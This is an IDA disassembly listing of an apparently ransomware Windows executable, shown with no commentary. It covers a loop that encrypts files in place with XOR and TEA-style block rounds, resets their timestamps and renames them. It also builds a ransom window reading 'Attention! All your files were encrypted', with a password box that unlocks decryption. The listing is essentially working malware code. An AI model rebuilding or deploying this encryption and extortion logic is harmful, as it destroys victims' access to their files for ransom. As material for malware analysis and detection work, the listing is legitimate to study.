.text:004016C0 loc_4016C0:                             ; CODE XREF: sub_4013A8+301↑j
.text:004016C0                                         ; sub_4013A8+311↑j
.text:004016C0                 push    0               ; dwMoveMethod
.text:004016C2                 push    0               ; lpDistanceToMoveHigh
.text:004016C4                 push    lDistanceToMove ; lDistanceToMove
.text:004016CA                 push    hFile           ; hFile
.text:004016D0                 call    SetFilePointer
.text:004016D5                 push    0               ; lpOverlapped
.text:004016D7                 push    offset NumberOfBytesWritten ; lpNumberOfBytesWritten
.text:004016DC                 push    nNumberOfBytesToWrite ; nNumberOfBytesToWrite
.text:004016E2                 push    lpBuffer        ; lpBuffer
.text:004016E8                 push    hFile           ; hFile
.text:004016EE                 call    WriteFile
.text:004016F3
.text:004016F3 loc_4016F3:                             ; CODE XREF: sub_4013A8+2C6↑j
.text:004016F3                 push    offset stru_40753E ; lpLastWriteTime
.text:004016F8                 push    offset stru_407536 ; lpLastAccessTime
.text:004016FD                 push    offset stru_40752E ; lpCreationTime
.text:00401702                 push    hFile           ; hFile
.text:00401708                 call    SetFileTime
.text:0040170D                 push    hFile           ; hObject
.text:00401713                 call    CloseHandle
.text:00401718                 push    offset NewFileName ; lpNewFileName
.text:0040171D                 push    offset ExistingFileName ; lpExistingFileName
.text:00401722                 call    MoveFileA
.text:00401727
.text:00401727 loc_401727:                             ; CODE XREF: sub_4013A8+47↑j
.text:00401727                                         ; sub_4013A8+60↑j ...
.text:00401727                 lea     eax, [ebp+FindFileData]
.text:0040172D                 push    eax             ; lpFindFileData
.text:0040172E                 push    dword ptr [ebp+FindFileData+13Eh] ; hFindFile
.text:00401731                 call    FindNextFileA
.text:00401736                 test    eax, eax
.text:00401738                 jnz     loc_4013CD
.text:0040173E                 push    dword ptr [ebp+FindFileData+13Eh] ; hFindFile
.text:00401741                 call    FindClose
.text:00401746
.text:00401746 locret_401746:                          ; CODE XREF: sub_4013A8+1B↑j
.text:00401746                 leave
.text:00401747                 retn
.text:00401747 sub_4013A8      endp
.text:00401747
.text:00401748
.text:00401748 ; =============== S U B R O U T I N E =======================================
.text:00401748
.text:00401748
.text:00401748 ; unsigned int __usercall sub_401748@<eax>(unsigned int result@<eax>)
.text:00401748 sub_401748      proc near               ; CODE XREF: sub_4013A8+2FC↑p
.text:00401748                 mov     ecx, eax
.text:0040174A                 shr     ecx, 2
.text:0040174D                 test    ecx, ecx
.text:0040174F                 jz      short locret_401779
.text:00401751                 cmp     eax, nNumberOfBytesToRead
.text:00401757                 jz      short loc_40175A
.text:00401759                 inc     ecx
.text:0040175A
.text:0040175A loc_40175A:                             ; CODE XREF: sub_401748+F↑j
.text:0040175A                 mov     esi, lpBuffer
.text:00401760                 mov     edi, esi
.text:00401762                 xor     edx, edx
.text:00401764
.text:00401764 loc_401764:                             ; CODE XREF: sub_401748+2F↓j
.text:00401764                 cmp     edx, 10h
.text:00401767                 jnz     short loc_40176B
.text:00401769                 xor     edx, edx
.text:0040176B
.text:0040176B loc_40176B:                             ; CODE XREF: sub_401748+1F↑j
.text:0040176B                 lodsd
.text:0040176C                 xor     eax, dword_406DB9[edx]
.text:00401772                 stosd
.text:00401773                 add     edx, 4
.text:00401776                 dec     ecx
.text:00401777                 jnz     short loc_401764
.text:00401779
.text:00401779 locret_401779:                          ; CODE XREF: sub_401748+7↑j
.text:00401779                 retn
.text:00401779 sub_401748      endp
.text:00401779
.text:0040177A
.text:0040177A ; =============== S U B R O U T I N E =======================================
.text:0040177A
.text:0040177A
.text:0040177A ; unsigned __int32 __usercall sub_40177A@<eax>(unsigned __int32 result@<eax>)
.text:0040177A sub_40177A      proc near               ; CODE XREF: sub_4013A8+30C↑p
.text:0040177A                 mov     ebx, eax
.text:0040177C                 shr     ebx, 3
.text:0040177F                 test    ebx, ebx
.text:00401781                 jz      short locret_401796
.text:00401783                 mov     esi, lpBuffer
.text:00401789
.text:00401789 loc_401789:                             ; CODE XREF: sub_40177A+1A↓j
.text:00401789                 push    esi
.text:0040178A                 push    esi
.text:0040178B                 call    sub_4017EC
.text:00401790                 add     esi, 8
.text:00401793                 dec     ebx
.text:00401794                 jnz     short loc_401789
.text:00401796
.text:00401796 locret_401796:                          ; CODE XREF: sub_40177A+7↑j
.text:00401796                 retn
.text:00401796 sub_40177A      endp
.text:00401796
.text:00401797
.text:00401797 ; =============== S U B R O U T I N E =======================================
.text:00401797
.text:00401797
.text:00401797 ; unsigned __int32 __usercall sub_401797@<eax>(unsigned __int32 result@<eax>)
.text:00401797 sub_401797      proc near               ; CODE XREF: sub_4013A8:loc_4016BB↑p
.text:00401797                 mov     ebx, eax
.text:00401799                 shr     ebx, 3
.text:0040179C                 test    ebx, ebx
.text:0040179E                 jz      short locret_4017B3
.text:004017A0                 mov     esi, lpBuffer
.text:004017A6
.text:004017A6 loc_4017A6:                             ; CODE XREF: sub_401797+1A↓j
.text:004017A6                 push    esi
.text:004017A7                 push    esi
.text:004017A8                 call    sub_4018B0
.text:004017AD                 add     esi, 8
.text:004017B0                 dec     ebx
.text:004017B1                 jnz     short loc_4017A6
.text:004017B3
.text:004017B3 locret_4017B3:                          ; CODE XREF: sub_401797+7↑j
.text:004017B3                 retn
.text:004017B3 sub_401797      endp
.text:004017B3
.text:004017B4
.text:004017B4 ; =============== S U B R O U T I N E =======================================
.text:004017B4
.text:004017B4 ; Attributes: bp-based frame
.text:004017B4
.text:004017B4 ; unsigned int *__stdcall sub_4017B4(unsigned int *)
.text:004017B4 sub_4017B4      proc near               ; CODE XREF: start+5B↓p
.text:004017B4
.text:004017B4 arg_0           = dword ptr  8
.text:004017B4
.text:004017B4                 push    ebp
.text:004017B5                 mov     ebp, esp
.text:004017B7                 mov     eax, [ebp+arg_0]
.text:004017BA                 mov     ecx, [eax]
.text:004017BC                 mov     edx, [eax+4]
.text:004017BF                 bswap   ecx
.text:004017C1                 bswap   edx
.text:004017C3                 mov     dword_406595, ecx
.text:004017C9                 mov     dword_406599, edx
.text:004017CF                 mov     ecx, [eax+8]
.text:004017D2                 mov     edx, [eax+0Ch]
.text:004017D5                 bswap   ecx
.text:004017D7                 bswap   edx
.text:004017D9                 mov     dword_40659D, ecx
.text:004017DF                 mov     dword_4065A1, edx
.text:004017E5                 leave
.text:004017E6                 retn    4
.text:004017E6 sub_4017B4      endp
.text:004017E6
.text:004017E6 ; ---------------------------------------------------------------------------
.text:004017E9                 align 4
.text:004017EC
.text:004017EC ; =============== S U B R O U T I N E =======================================
.text:004017EC
.text:004017EC ; Attributes: bp-based frame
.text:004017EC
.text:004017EC ; unsigned __int32 __stdcall sub_4017EC(unsigned int *, unsigned __int32 *)
.text:004017EC sub_4017EC      proc near               ; CODE XREF: sub_40177A+11↑p
.text:004017EC
.text:004017EC arg_0           = dword ptr  8
.text:004017EC arg_4           = dword ptr  0Ch
.text:004017EC
.text:004017EC                 push    ebp
.text:004017ED                 mov     ebp, esp
.text:004017EF                 push    edi
.text:004017F0                 push    esi
.text:004017F1                 push    ebx
.text:004017F2                 mov     esi, [ebp+arg_0]
.text:004017F5                 mov     eax, [esi]
.text:004017F7                 mov     edx, [esi+4]
.text:004017FA                 xor     ebx, ebx
.text:004017FC                 bswap   eax
.text:004017FE                 bswap   edx
.text:00401800
.text:00401800 loc_401800:                             ; CODE XREF: sub_4017EC+AA↓j
.text:00401800                 add     ebx, 9E3779B9h
.text:00401806                 mov     ecx, edx
.text:00401808                 shl     ecx, 4
.text:0040180B                 mov     edi, edx
.text:0040180D                 lea     esi, [ebx+edx]
.text:00401810                 add     ecx, dword_406585
.text:00401816                 shr     edi, 5
.text:00401819                 xor     ecx, esi
.text:0040181B                 add     edi, dword_406589
.text:00401821                 xor     ecx, edi
.text:00401823                 add     eax, ecx
.text:00401825                 mov     ecx, eax
.text:00401827                 shl     ecx, 4
.text:0040182A                 mov     edi, eax
.text:0040182C                 lea     esi, [ebx+eax]
.text:0040182F                 add     ecx, dword_40658D
.text:00401835                 shr     edi, 5
.text:00401838                 xor     ecx, esi
.text:0040183A                 add     edi, dword_406591
.text:00401840                 xor     ecx, edi
.text:00401842                 add     edx, ecx
.text:00401844                 add     ebx, 9E3779B9h
.text:0040184A                 mov     ecx, edx
.text:0040184C                 shl     ecx, 4
.text:0040184F                 mov     edi, edx
.text:00401851                 lea     esi, [ebx+edx]
.text:00401854                 add     ecx, dword_406585
.text:0040185A                 shr     edi, 5
.text:0040185D                 xor     ecx, esi
.text:0040185F                 add     edi, dword_406589
.text:00401865                 xor     ecx, edi
.text:00401867                 add     eax, ecx
.text:00401869                 mov     ecx, eax
.text:0040186B                 shl     ecx, 4
.text:0040186E                 mov     edi, eax
.text:00401870                 lea     esi, [ebx+eax]
.text:00401873                 add     ecx, dword_40658D
.text:00401879                 shr     edi, 5
.text:0040187C                 xor     ecx, esi
.text:0040187E                 add     edi, dword_406591
.text:00401884                 xor     ecx, edi
.text:00401886                 add     edx, ecx
.text:00401888                 mov     ecx, 9E3779B9h
.text:0040188D                 imul    ecx, dword_4065A5
.text:00401894                 cmp     ebx, ecx
.text:00401896                 jnz     loc_401800
.text:0040189C                 bswap   eax
.text:0040189E                 bswap   edx
.text:004018A0                 mov     esi, [ebp+arg_4]
.text:004018A3                 mov     [esi], eax
.text:004018A5                 mov     [esi+4], edx
.text:004018A8                 pop     ebx
.text:004018A9                 pop     esi
.text:004018AA                 pop     edi
.text:004018AB                 leave
.text:004018AC                 retn    8
.text:004018AC sub_4017EC      endp
.text:004018AC
.text:004018AC ; ---------------------------------------------------------------------------
.text:004018AF                 align 10h
.text:004018B0
.text:004018B0 ; =============== S U B R O U T I N E =======================================
.text:004018B0
.text:004018B0 ; Attributes: bp-based frame
.text:004018B0
.text:004018B0 ; unsigned __int32 __stdcall sub_4018B0(unsigned int *, unsigned __int32 *)
.text:004018B0 sub_4018B0      proc near               ; CODE XREF: sub_401797+11↑p
.text:004018B0
.text:004018B0 arg_0           = dword ptr  8
.text:004018B0 arg_4           = dword ptr  0Ch
.text:004018B0
.text:004018B0                 push    ebp
.text:004018B1                 mov     ebp, esp
.text:004018B3                 push    edi
.text:004018B4                 push    esi
.text:004018B5                 push    ebx
.text:004018B6                 mov     esi, [ebp+arg_0]
.text:004018B9                 mov     eax, [esi]
.text:004018BB                 mov     edx, [esi+4]
.text:004018BE                 mov     ebx, 9E3779B9h
.text:004018C3                 imul    ebx, dword_4065A5
.text:004018CA                 bswap   eax
.text:004018CC                 bswap   edx
.text:004018CE
.text:004018CE loc_4018CE:                             ; CODE XREF: sub_4018B0+A6↓j
.text:004018CE                 mov     ecx, eax
.text:004018D0                 shl     ecx, 4
.text:004018D3                 mov     edi, eax
.text:004018D5                 lea     esi, [ebx+eax]
.text:004018D8                 add     ecx, dword_40658D
.text:004018DE                 shr     edi, 5
.text:004018E1                 xor     ecx, esi
.text:004018E3                 add     edi, dword_406591
.text:004018E9                 xor     ecx, edi
.text:004018EB                 sub     edx, ecx
.text:004018ED                 mov     ecx, edx
.text:004018EF                 shl     ecx, 4
.text:004018F2                 mov     edi, edx
.text:004018F4                 lea     esi, [ebx+edx]
.text:004018F7                 add     ecx, dword_406585
.text:004018FD                 shr     edi, 5
.text:00401900                 xor     ecx, esi
.text:00401902                 add     edi, dword_406589
.text:00401908                 xor     ecx, edi
.text:0040190A                 sub     eax, ecx
.text:0040190C                 sub     ebx, 9E3779B9h
.text:00401912                 mov     ecx, eax
.text:00401914                 shl     ecx, 4
.text:00401917                 mov     edi, eax
.text:00401919                 lea     esi, [ebx+eax]
.text:0040191C                 add     ecx, dword_40658D
.text:00401922                 shr     edi, 5
.text:00401925                 xor     ecx, esi
.text:00401927                 add     edi, dword_406591
.text:0040192D                 xor     ecx, edi
.text:0040192F                 sub     edx, ecx
.text:00401931                 mov     ecx, edx
.text:00401933                 shl     ecx, 4
.text:00401936                 mov     edi, edx
.text:00401938                 lea     esi, [ebx+edx]
.text:0040193B                 add     ecx, dword_406585
.text:00401941                 shr     edi, 5
.text:00401944                 xor     ecx, esi
.text:00401946                 add     edi, dword_406589
.text:0040194C                 xor     ecx, edi
.text:0040194E                 sub     eax, ecx
.text:00401950                 sub     ebx, 9E3779B9h
.text:00401956                 jnz     loc_4018CE
.text:0040195C                 bswap   eax
.text:0040195E                 bswap   edx
.text:00401960                 mov     esi, [ebp+arg_4]
.text:00401963                 mov     [esi], eax
.text:00401965                 mov     [esi+4], edx
.text:00401968                 pop     ebx
.text:00401969                 pop     esi
.text:0040196A                 pop     edi
.text:0040196B                 leave
.text:0040196C                 retn    8
.text:0040196C sub_4018B0      endp
.text:0040196C
.text:0040196F ; ---------------------------------------------------------------------------
.text:0040196F ; START OF FUNCTION CHUNK FOR start
.text:0040196F
.text:0040196F loc_40196F:                             ; CODE XREF: start+98↓j
.text:0040196F                 call    InitCommonControls
.text:00401974                 push    0               ; lpModuleName
.text:00401976                 call    GetModuleHandleA
.text:0040197B                 mov     hInstance, eax
.text:00401980                 call    GetCommandLineA
.text:00401985                 mov     dword_40775E, eax
.text:0040198A                 push    0Ah
.text:0040198C                 push    dword_40775E
.text:00401992                 push    0
.text:00401994                 push    hInstance
.text:0040199A                 call    $+5
.text:0040199F                 push    ebp
.text:004019A0                 mov     ebp, esp
.text:004019A2                 add     esp, 0FFFFFFA4h
.text:004019A5                 mov     dword ptr [ebp-30h], 30h ; '0'
.text:004019AC                 mov     dword ptr [ebp-2Ch], 2003h
.text:004019B3                 mov     dword ptr [ebp-28h], offset sub_401AB9
.text:004019BA                 mov     dword ptr [ebp-24h], 0
.text:004019C1                 mov     dword ptr [ebp-20h], 0
.text:004019C8                 push    dword ptr [ebp+8]
.text:004019CB                 pop     dword ptr [ebp-1Ch]
.text:004019CE                 mov     dword ptr [ebp-10h], 10h
.text:004019D5                 mov     dword ptr [ebp-0Ch], 0
.text:004019DC                 mov     dword ptr [ebp-8], offset ClassName ; "0p3nSOurc3 X0r157, motherfucker!"
.text:004019E3                 push    7F00h           ; lpCursorName
.text:004019E8                 push    0               ; hInstance
.text:004019EA                 call    LoadCursorA
.text:004019EF                 mov     [ebp-14h], eax
.text:004019F2                 mov     dword ptr [ebp-4], 0
.text:004019F9                 mov     dword ptr [ebp-18h], 0
.text:00401A00                 lea     eax, [ebp-30h]
.text:00401A03                 push    eax             ; WNDCLASSEXA *
.text:00401A04                 call    RegisterClassExA
.text:00401A09                 mov     dword ptr [ebp-50h], 12Ch
.text:00401A10                 mov     dword ptr [ebp-54h], 69h ; 'i'
.text:00401A17                 push    0               ; nIndex
.text:00401A19                 call    GetSystemMetrics
.text:00401A1E                 push    eax
.text:00401A1F                 push    dword ptr [ebp-50h]
.text:00401A22                 call    sub_401E5D
.text:00401A27                 mov     [ebp-58h], eax
.text:00401A2A                 push    1               ; nIndex
.text:00401A2C                 call    GetSystemMetrics
.text:00401A31                 push    eax
.text:00401A32                 push    dword ptr [ebp-54h]
.text:00401A35                 call    sub_401E5D
.text:00401A3A                 mov     [ebp-5Ch], eax
.text:00401A3D                 xor     eax, eax
.text:00401A3F                 push    eax             ; lpParam
.text:00401A40                 push    dword ptr [ebp+8] ; hInstance
.text:00401A43                 push    eax             ; hMenu
.text:00401A44                 push    eax             ; hWndParent
.text:00401A45                 push    dword ptr [ebp-54h] ; nHeight
.text:00401A48                 push    dword ptr [ebp-50h] ; nWidth
.text:00401A4B                 push    dword ptr [ebp-5Ch] ; Y
.text:00401A4E                 push    dword ptr [ebp-58h] ; X
.text:00401A51                 push    10000000h       ; dwStyle
.text:00401A56                 mov     al, byte_40752D
.text:00401A5B                 cmp     al, 1
.text:00401A5D                 jnz     short loc_401A66
.text:00401A5F                 push    offset Caption
.text:00401A64                 jmp     short loc_401A6B
.text:00401A66 ; ---------------------------------------------------------------------------
.text:00401A66
.text:00401A66 loc_401A66:                             ; CODE XREF: start-774↑j
.text:00401A66                 push    offset WindowName ; "Attention!"
.text:00401A6B
.text:00401A6B loc_401A6B:                             ; CODE XREF: start-76D↑j
.text:00401A6B                 push    offset ClassName ; "0p3nSOurc3 X0r157, motherfucker!"
.text:00401A70                 push    40180h          ; dwExStyle
.text:00401A75                 call    CreateWindowExA
.text:00401A7A                 mov     hWnd, eax
.text:00401A7F                 push    hWnd            ; hWnd
.text:00401A85                 call    UpdateWindow
.text:00401A8A
.text:00401A8A loc_401A8A:                             ; CODE XREF: start-721↓j
.text:00401A8A                 push    0               ; wMsgFilterMax
.text:00401A8C                 push    0               ; wMsgFilterMin
.text:00401A8E                 push    0               ; hWnd
.text:00401A90                 lea     eax, [ebp-4Ch]
.text:00401A93                 push    eax             ; lpMsg
.text:00401A94                 call    GetMessageA
.text:00401A99                 cmp     eax, 0
.text:00401A9C                 jz      short loc_401AB2
.text:00401A9E                 lea     eax, [ebp-4Ch]
.text:00401AA1                 push    eax             ; lpMsg
.text:00401AA2                 call    TranslateMessage
.text:00401AA7                 lea     eax, [ebp-4Ch]
.text:00401AAA                 push    eax             ; lpMsg
.text:00401AAB                 call    DispatchMessageA
.text:00401AB0                 jmp     short loc_401A8A
.text:00401AB2 ; ---------------------------------------------------------------------------
.text:00401AB2
.text:00401AB2 loc_401AB2:                             ; CODE XREF: start-735↑j
.text:00401AB2                 mov     eax, [ebp-44h]
.text:00401AB5                 leave
.text:00401AB6                 retn    10h
.text:00401AB6 ; END OF FUNCTION CHUNK FOR start
.text:00401AB9
.text:00401AB9 ; =============== S U B R O U T I N E =======================================
.text:00401AB9
.text:00401AB9 ; Attributes: bp-based frame
.text:00401AB9
.text:00401AB9 ; LRESULT __stdcall sub_401AB9(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
.text:00401AB9 sub_401AB9      proc near               ; DATA XREF: start-81E↑o
.text:00401AB9
.text:00401AB9 Paint           = tagPAINTSTRUCT ptr -44h
.text:00401AB9 hWnd            = dword ptr  8
.text:00401AB9 Msg             = dword ptr  0Ch
.text:00401AB9 wParam          = dword ptr  10h
.text:00401AB9 lParam          = dword ptr  14h
.text:00401AB9
.text:00401AB9                 push    ebp
.text:00401ABA                 mov     ebp, esp
.text:00401ABC                 add     esp, 0FFFFFFBCh
.text:00401ABF                 cmp     [ebp+Msg], 111h
.text:00401AC6                 jnz     loc_401C4A
.text:00401ACC                 cmp     [ebp+wParam], 1F5h
.text:00401AD3                 jnz     short loc_401AE1
.text:00401AD5                 push    0               ; uExitCode
.text:00401AD7                 call    ExitProcess
.text:00401ADC ; ---------------------------------------------------------------------------
.text:00401ADC                 jmp     loc_401E48
.text:00401AE1 ; ---------------------------------------------------------------------------
.text:00401AE1
.text:00401AE1 loc_401AE1:                             ; CODE XREF: sub_401AB9+1A↑j
.text:00401AE1                 cmp     [ebp+wParam], 1F6h
.text:00401AE8                 jnz     short loc_401B25
.text:00401AEA                 mov     al, byte_40752D
.text:00401AEF                 cmp     al, 1
.text:00401AF1                 jnz     short loc_401B0C
.text:00401AF3                 push    40h ; '@'       ; uType
.text:00401AF5                 push    offset Caption  ; lpCaption
.text:00401AFA                 push    offset byte_4040F8 ; lpText
.text:00401AFF                 push    [ebp+hWnd]      ; hWnd
.text:00401B02                 call    MessageBoxA
.text:00401B07                 jmp     loc_401E48
.text:00401B0C ; ---------------------------------------------------------------------------
.text:00401B0C
.text:00401B0C loc_401B0C:                             ; CODE XREF: sub_401AB9+38↑j
.text:00401B0C                 push    40h ; '@'       ; uType
.text:00401B0E                 push    offset WindowName ; "Attention!"
.text:00401B13                 push    offset aAttentionAllYo ; "Attention! All your files were encrypte"...
.text:00401B18                 push    [ebp+hWnd]      ; hWnd
.text:00401B1B                 call    MessageBoxA
.text:00401B20                 jmp     loc_401E48
.text:00401B25 ; ---------------------------------------------------------------------------
.text:00401B25
.text:00401B25 loc_401B25:                             ; CODE XREF: sub_401AB9+2F↑j
.text:00401B25                 cmp     [ebp+wParam], 1F4h
.text:00401B2C                 jnz     loc_401E48
.text:00401B32                 cmp     dword_407525, 0
.text:00401B39                 jnz     short loc_401B56
.text:00401B3B                 mov     eax, 0FFFFFFFFh
.text:00401B40                 call    sub_40124F
.text:00401B45                 call    sub_4021C0
.text:00401B4A                 call    sub_40214B
.text:00401B4F                 push    0               ; uExitCode
.text:00401B51                 call    ExitProcess
.text:00401B56 ; ---------------------------------------------------------------------------
.text:00401B56
.text:00401B56 loc_401B56:                             ; CODE XREF: sub_401AB9+80↑j
.text:00401B56                 dec     dword_407525
.text:00401B5C                 push    101h            ; cchMax
.text:00401B61                 push    offset pbData   ; lpString
.text:00401B66                 push    2BCh            ; nIDDlgItem
.text:00401B6B                 push    [ebp+hWnd]      ; hDlg
.text:00401B6E                 call    GetDlgItemTextA
.text:00401B73                 test    eax, eax
.text:00401B75                 jz      loc_401C12
.text:00401B7B                 push    offset pbData   ; lpString
.text:00401B80                 call    lstrlenA
.text:00401B85                 push    10h             ; pdwDataLen
.text:00401B87                 push    offset byte_406565 ; BYTE *
.text:00401B8C                 push    eax             ; dwDataLen
.text:00401B8D                 push    offset pbData   ; pbData
.text:00401B92                 call    sub_401F15
.text:00401B97                 push    10h             ; pdwDataLen
.text:00401B99                 push    offset byte_406575 ; BYTE *
.text:00401B9E                 push    10h             ; dwDataLen
.text:00401BA0                 push    offset byte_406565 ; pbData
.text:00401BA5                 call    sub_401F15
.text:00401BAA                 push    10h             ; pdwDataLen
.text:00401BAC                 push    offset byte_406565 ; BYTE *
.text:00401BB1                 push    10h             ; dwDataLen
.text:00401BB3                 push    offset byte_406575 ; pbData
.text:00401BB8                 call    sub_401F15
.text:00401BBD                 push    10h             ; pdwDataLen
.text:00401BBF                 push    offset byte_406575 ; BYTE *
.text:00401BC4                 push    10h             ; dwDataLen
.text:00401BC6                 push    offset byte_406565 ; pbData
.text:00401BCB                 call    sub_401F15
.text:00401BD0                 push    10h             ; pdwDataLen
.text:00401BD2                 push    offset byte_406565 ; BYTE *
.text:00401BD7                 push    10h             ; dwDataLen
.text:00401BD9                 push    offset byte_406575 ; pbData
.text:00401BDE                 call    sub_401F15
.text:00401BE3                 mov     ecx, 10h
.text:00401BE8                 mov     esi, offset byte_406565
.text:00401BED                 mov     edi, offset unk_406DC9
.text:00401BF2
.text:00401BF2 loc_401BF2:                             ; CODE XREF: sub_401AB9+141↓j
.text:00401BF2                 lodsb
.text:00401BF3                 mov     dl, [edi]
.text:00401BF5                 inc     edi
.text:00401BF6                 cmp     al, dl
.text:00401BF8                 jnz     short loc_401C12
.text:00401BFA                 loop    loc_401BF2
.text:00401BFC                 call    sub_401216
.text:00401C01                 call    sub_4021C0
.text:00401C06                 call    sub_40214B
.text:00401C0B                 push    0               ; uExitCode
.text:00401C0D                 call    ExitProcess
.text:00401C12 ; ---------------------------------------------------------------------------
.text:00401C12
.text:00401C12 loc_401C12:                             ; CODE XREF: sub_401AB9+BC↑j
.text:00401C12                                         ; sub_401AB9+13F↑j
.text:00401C12                 mov     al, byte_40752D
.text:00401C17                 cmp     al, 1
.text:00401C19                 jnz     short loc_401C31
.text:00401C1B                 push    10h             ; uType
.text:00401C1D                 push    offset byte_4040BB ; lpCaption
.text:00401C22                 push    offset byte_4040CA ; lpText
.text:00401C27                 push    [ebp+hWnd]      ; hWnd
.text:00401C2A                 call    MessageBoxA
.text:00401C2F                 jmp     short loc_401C45
.text:00401C31 ; ---------------------------------------------------------------------------
.text:00401C31
.text:00401C31 loc_401C31:                             ; CODE XREF: sub_401AB9+160↑j
.text:00401C31                 push    10h             ; uType
.text:00401C33                 push    offset aError   ; "Error!"
.text:00401C38                 push    offset aPasswordIsInco ; "Password is incorrect!"
.text:00401C3D                 push    [ebp+hWnd]      ; hWnd
.text:00401C40                 call    MessageBoxA
.text:00401C45
.text:00401C45 loc_401C45:                             ; CODE XREF: sub_401AB9+176↑j
.text:00401C45                 jmp     loc_401E48
.text:00401C4A ; ---------------------------------------------------------------------------
.text:00401C4A
.text:00401C4A loc_401C4A:                             ; CODE XREF: sub_401AB9+D↑j
.text:00401C4A                 cmp     [ebp+Msg], 1
.text:00401C4E                 jnz     loc_401DFA
.text:00401C54                 cmp     dword_407525, 0
.text:00401C5B                 jnz     short loc_401C63
.text:00401C5D                 dec     dword_407525
.text:00401C63
.text:00401C63 loc_401C63:                             ; CODE XREF: sub_401AB9+1A2↑j
.text:00401C63                 push    offset aTahoma  ; "Tahoma"
.text:00401C68                 push    offset lf.lfFaceName ; lpString1
.text:00401C6D                 call    lstrcpyA
.text:00401C72                 mov     lf.lfHeight, 0FFFFFFF5h
.text:00401C7C                 mov     lf.lfWidth, 0
.text:00401C86                 mov     lf.lfWeight, 1F4h
.text:00401C90                 push    offset lf       ; lplf
.text:00401C95                 call    CreateFontIndirectA
.text:00401C9A                 mov     wParam, eax
.text:00401C9F                 mov     al, byte_40752D
.text:00401CA4                 cmp     al, 1
.text:00401CA6                 jnz     short loc_401CC4
.text:00401CA8                 push    0               ; hMenu
.text:00401CAA                 push    11h             ; nHeight
.text:00401CAC                 push    0C8h            ; nWidth
.text:00401CB1                 push    5               ; Y
.text:00401CB3                 push    6               ; X
.text:00401CB5                 push    [ebp+hWnd]      ; hWndParent
.text:00401CB8                 push    offset byte_404414 ; lpWindowName
.text:00401CBD                 call    sub_401EAB
.text:00401CC2                 jmp     short loc_401CDE
.text:00401CC4 ; ---------------------------------------------------------------------------
.text:00401CC4
.text:00401CC4 loc_401CC4:                             ; CODE XREF: sub_401AB9+1ED↑j
.text:00401CC4                 push    0               ; hMenu
.text:00401CC6                 push    11h             ; nHeight
.text:00401CC8                 push    0C8h            ; nWidth
.text:00401CCD                 push    5               ; Y
.text:00401CCF                 push    6               ; X
.text:00401CD1                 push    [ebp+hWnd]      ; hWndParent
.text:00401CD4                 push    offset aPassword ; "Password:"
.text:00401CD9                 call    sub_401EAB
.text:00401CDE
.text:00401CDE loc_401CDE:                             ; CODE XREF: sub_401AB9+209↑j
.text:00401CDE                 push    1               ; lParam
.text:00401CE0                 push    wParam          ; wParam
.text:00401CE6                 push    30h ; '0'       ; Msg
.text:00401CE8                 push    eax             ; hWnd
.text:00401CE9                 call    SendMessageA
.text:00401CEE                 push    1F4h            ; hMenu
.text:00401CF3                 push    19h             ; nHeight
.text:00401CF5                 push    0AFh            ; nWidth
.text:00401CFA                 push    32h ; '2'       ; Y
.text:00401CFC                 push    5               ; X
.text:00401CFE                 push    [ebp+hWnd]      ; hWndParent
.text:00401D01                 push    offset byte_404426 ; lpWindowName
.text:00401D06                 call    sub_401EE0
.text:00401D0B                 mov     dword_40776E, eax
.text:00401D10                 push    1               ; lParam
.text:00401D12                 push    wParam          ; wParam
.text:00401D18                 push    30h ; '0'       ; Msg
.text:00401D1A                 push    eax             ; hWnd
.text:00401D1B                 call    SendMessageA
.text:00401D20                 push    1F6h            ; hMenu
.text:00401D25                 push    19h             ; nHeight
.text:00401D27                 push    32h ; '2'       ; nWidth
.text:00401D29                 push    32h ; '2'       ; Y
.text:00401D2B                 push    0B9h            ; X
.text:00401D30                 push    [ebp+hWnd]      ; hWndParent
.text:00401D33                 push    offset asc_404429 ; "???"
.text:00401D38                 call    sub_401EE0
.text:00401D3D                 mov     dword_407776, eax
.text:00401D42                 push    1               ; lParam
.text:00401D44                 push    wParam          ; wParam
.text:00401D4A                 push    30h ; '0'       ; Msg
.text:00401D4C                 push    eax             ; hWnd
.text:00401D4D                 call    SendMessageA
.text:00401D52                 push    2BCh            ; hMenu
.text:00401D57                 push    [ebp+hWnd]      ; hWndParent
.text:00401D5A                 push    17h             ; nHeight
.text:00401D5C                 push    11Dh            ; nWidth
.text:00401D61                 push    14h             ; Y
.text:00401D63                 push    5               ; X
.text:00401D65                 push    offset byte_40444B ; lpWindowName
.text:00401D6A                 call    sub_401E73
.text:00401D6F                 mov     dword_40776A, eax
.text:00401D74                 push    1               ; lParam
.text:00401D76                 push    wParam          ; wParam
.text:00401D7C                 push    30h ; '0'       ; Msg
.text:00401D7E                 push    eax             ; hWnd
.text:00401D7F                 call    SendMessageA
.text:00401D84                 mov     al, byte_40752D
.text:00401D89                 cmp     al, 1
.text:00401D8B                 jnz     short loc_401DAC
.text:00401D8D                 push    1F5h            ; hMenu
.text:00401D92                 push    19h             ; nHeight
.text:00401D94                 push    32h ; '2'       ; nWidth
.text:00401D96                 push    32h ; '2'       ; Y
.text:00401D98                 push    0F0h            ; X
.text:00401D9D                 push    [ebp+hWnd]      ; hWndParent
.text:00401DA0                 push    offset byte_40442D ; lpWindowName
.text:00401DA5                 call    sub_401EE0
.text:00401DAA                 jmp     short loc_401DC9
.text:00401DAC ; ---------------------------------------------------------------------------
.text:00401DAC
.text:00401DAC loc_401DAC:                             ; CODE XREF: sub_401AB9+2D2↑j
.text:00401DAC                 push    1F5h            ; hMenu
.text:00401DB1                 push    19h             ; nHeight
.text:00401DB3                 push    32h ; '2'       ; nWidth
.text:00401DB5                 push    32h ; '2'       ; Y
.text:00401DB7                 push    0F0h            ; X
.text:00401DBC                 push    [ebp+hWnd]      ; hWndParent
.text:00401DBF                 push    offset aExit    ; "Exit"
.text:00401DC4                 call    sub_401EE0
.text:00401DC9
.text:00401DC9 loc_401DC9:                             ; CODE XREF: sub_401AB9+2F1↑j
.text:00401DC9                 mov     dword_407772, eax
.text:00401DCE                 push    1               ; lParam
.text:00401DD0                 push    wParam          ; wParam
.text:00401DD6                 push    30h ; '0'       ; Msg
.text:00401DD8                 push    eax             ; hWnd
.text:00401DD9                 call    SendMessageA
.text:00401DDE                 mov     al, byte_40752B
.text:00401DE3                 cmp     al, 1
.text:00401DE5                 jnz     short loc_401E48
.text:00401DE7                 push    10h             ; uType
.text:00401DE9                 push    0               ; lpCaption
.text:00401DEB                 push    lpText          ; lpText
.text:00401DF1                 push    0               ; hWnd
.text:00401DF3                 call    MessageBoxA
.text:00401DF8                 jmp     short loc_401E48
